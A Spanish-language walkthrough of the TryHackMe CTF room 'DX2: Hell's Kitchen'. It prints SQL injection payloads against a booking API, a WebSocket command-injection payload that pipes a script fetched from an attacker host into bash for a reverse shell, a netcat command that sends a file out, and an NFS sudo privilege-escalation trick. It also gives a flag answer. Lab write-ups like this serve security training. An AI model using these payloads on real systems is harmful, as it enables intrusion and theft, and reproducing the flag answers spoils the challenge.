# DX2_ Hell's Kitchen

| **Dificultad** | Hard |
| **Tipo** | CTF |
| **Slug** | `dx2hellskitchen` |
| **Link** | [TryHackMe](https://tryhackme.com/room/dx2hellskitchen) |
| **Sección** | 03 Level Hard |
| **Fuente** | Web (tryhackme.com, GitHub thmrevenant/tryhackme, 0xb0b.gitbook.io, jaxafed.github.io, matty69v.app, localnest.xyz) |
| **Componentes** | SQLi / SQLite / Base58 / IDOR / WebSocket / command injection / su / NFS / reverse shell |
| **Impacto** | Secuela de "DX1: Liberty Island": SQLi en la API de reservas de un hotel, credenciales de una base SQLite, IDOR en un cliente de correo, inyección de comandos vía WebSocket y pivoteo gilbert → sandra → jojo para escalar a root abusando de NFS. |

---

**Contexto:** Sala Premium de dificultad Hard con una máquina desplegable, secuela de la sala "DX1: Liberty Island" (universo Deus Ex). La cadena de ataque pasa por inyección SQL en la API de un hotel, credenciales robadas de una base SQLite, IDOR en un cliente de correo, inyección de comandos vía WebSocket, pivoteo entre usuarios (gilbert → sandra → jojo) y abuso de NFS para escalar a root.

## Solucionario

### Task 1: Investigate the server of an associate

**Explicación:** La cadena arranca en el puerto 80 (hotel "The 'Ton"). El JS de `/new-booking` lee la cookie `BOOKING_KEY` y la manda a `/api/booking-info`; la cookie va codificada en **Base58** y contiene `booking_id:<7 dígitos>`. El endpoint es vulnerable a **SQLi**: con la comilla da `bad request`, comentando con `';-- -` vuelve a `not found`, `ORDER BY` revela 2 columnas y `UNION SELECT 1,2` confirma la inyección. Se identifica SQLite 3.42.0 y se enumera `sqlite_master` hasta volcar `email_access`, donde están las credenciales `pdenton:<password>` del portal NYComm.

```sql
booking_key=<base58('booking_id:1234567')>
# payloads UNION
';-- -
' ORDER BY 2--
' UNION SELECT 1,2--
' UNION SELECT 1,sql FROM sqlite_master--
```

Con las credenciales se accede al portal del puerto 4346 y, en `/mail`, un IDOR `message_id` (respuestas en base64) revela la Web Flag en el mensaje `3`. A continuación, el WebSocket `ws://<host>/ws` envía una zona horaria que el servidor pasa a `TZ=<zona> date`: inyectando `Cuba; <cmd>;` se ejecutan comandos. Como el firewall solo permite salir por `80/443`, se usa `curl <atacante>|bash` con un listener en 443 para obtener shell como **gilbert**; en `/srv/.dad` está la contraseña de **sandra** (User Flag en `/home/sandra/user.txt`); la de **jojo** está oculta en `boss.jpg` (`nc -w 3 <atacante> 443 < boss.jpg`). `sudo -l` como jojo permite `mount.nfs` como root.

```bash
# reverse shell vía TZ
UTC;curl http://<atacante>:80/rev.sh|bash;
# jojo: sudo -l -> /usr/sbin/mount.nfs
# montar share NFS del atacante sobre /usr/sbin y sustituir mount.nfs
sudo /usr/sbin/mount.nfs
```

Con `sudo /usr/sbin/mount.nfs` reemplazado por `/bin/sh` (share NFS montado sobre `/usr/sbin/`, sin `no_root_squash`) se obtiene shell root y la Root Flag.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the Web Flag? | `thm{adb5b797ee0d01a8c052dbee46fbc065e8c52afd}` |
| 2 | What is the User Flag? | `<flag_generada_por_instancia>` (en `/home/sandra/user.txt`; se obtiene tras pivotar a `sandra`. No es estática: cambia en cada despliegue. *Reconstruido por web.*) |
| 3 | What is the Root Flag? | `<flag_generada_por_instancia>` (en `/root/root.txt`; formato de ejemplo visto en writeups: `thm{7f6[...]d3b}`, redactado por los autores. *Reconstruido por web.*) |

### Task 2: Credits

**Explicación:** Tarea de cierre con los créditos de la sala (autor: Chris Pritchard). No requiere respuesta.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | No answer needed | `No answer needed` |

---

**Metodología:**
1. **Reconocimiento:** `nmap -T4 -n -sC -sV -Pn -p- <IP>` revela solo dos puertos web: `80` (hotel "The 'Ton") y `4346` (portal NYComm / NYCCOM.USERS.PUB).
2. **Análisis de la web (puerto 80):** en `/` y `/new-booking` se analizan `/static/check-rooms.js` y `/static/new-booking.js`; el JS lee la cookie `BOOKING_KEY` y la envía a `/api/booking-info?booking_key=...`.
3. **Decodificación:** la cookie está codificada en **Base58** y contiene `booking_id:<7 dígitos>`; el endpoint devuelve `not found`.
4. **Inyección SQL en `/api/booking-info`:** se confirma SQLi con la comilla (`bad request`) y comentando con `';-- -` (vuelve a `not found`). Con `ORDER BY` se descubre que la consulta usa **2 columnas** y con `UNION SELECT 1,2` se confirma: `{"room_num":"1","days":"2"}`.
5. **Fingerprinting de la BD:** `sqlite_version()` → **SQLite 3.42.0**.
6. **Enumeración del esquema:** `sqlite_schema`/`sqlite_master` devuelve las tablas `email_access`, `reservations`, `bookings_temp`. `email_access` tiene columnas `guest_name`, `email_username`, `email_password` y contiene la credencial `pdenton:<password>` (login del portal NYComm en el puerto 4346). *(Alternativa: SQLMap con un tamper script de codificación Base58).*
7. **Login en NYComm y flag Web:** con las credenciales se accede a `dx2.thm:4346`, endpoint `/mail`; el código fuente minificado revela `/api/message?message_id=<id>` (IDOR) con respuestas en Base64; el mensaje `message_id=3` (usuario JReyes) contiene la **Web Flag**.
8. **Inyección de comandos vía WebSocket:** el JS abre `ws://<host>/ws` y envía la zona horaria cada segundo; el servidor ejecuta algo como `TZ=<zona> date`. Enviar `Cuba; <cmd>;` permite ejecutar comandos (con límite de longitud del payload).
9. **Reverse shell:** como la máquina solo puede conectar a los puertos `80` y `443` (firewall visible con `sudo ufw status`), se sirve un script con `python3 -m http.server 80` y se captura la shell con `nc -lvnp 443`; payload `UTC;curl <atacante>|bash;`. Shell como **gilbert**.
10. **Pivoteo a sandra:** en el home de gilbert, `hotel-jobs.txt` contiene la contraseña de gilbert y una pista; en `/srv/.dad` se encuentra la contraseña de **sandra** → `su sandra`. Lectura de la **User Flag** en `/home/sandra/user.txt`.
11. **Pivoteo a jojo:** en `/home/sandra/Pictures` está `boss.jpg` con el password de **jojo** oculto en la imagen (transferencia con `nc -w 3 <atacante> 443 < boss.jpg`). `sudo -l` como jojo permite ejecutar `/usr/sbin/mount.nfs` como root.
12. **Escalada a root vía NFS:** se monta un share NFS del atacante (configurado en los puertos 80/443 para sortear el firewall) sobre `/usr/sbin/` de la víctima y se sustituye `/usr/sbin/mount.nfs` por `/bin/sh` (o un binario SUID). Ejecutando `sudo /usr/sbin/mount.nfs` se obtiene una shell **root** y se lee la **Root Flag** en `/root/root.txt`.

**Learning chain:** `Recon (nmap: 80, 4346) → Puerto 80 (JS → /api/booking-info) → Base58 decode → SQLi UNION (2 columnas) → SQLite 3.42.0 → sqlite_master → email_access → credencial pdenton → Login NYComm :4346 → IDOR /api/message?message_id=3 → WEB FLAG → WebSocket (TZ=<zona> date) → command injection → reverse shell curl|bash (80/443) → shell gilbert → /srv/.dad → sandra → User Flag → boss.jpg → jojo → sudo mount.nfs → NFS sobre /usr/sbin → shell root → Root Flag`

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1059 (Command and Scripting Interpreter), T1105 (Ingress Tool Transfer), T1078 (Valid Accounts), T1068 (Exploitation for Privilege Escalation)

**Fuente:** [TryHackMe - DX2_ Hell's Kitchen](https://tryhackme.com/room/dx2hellskitchen)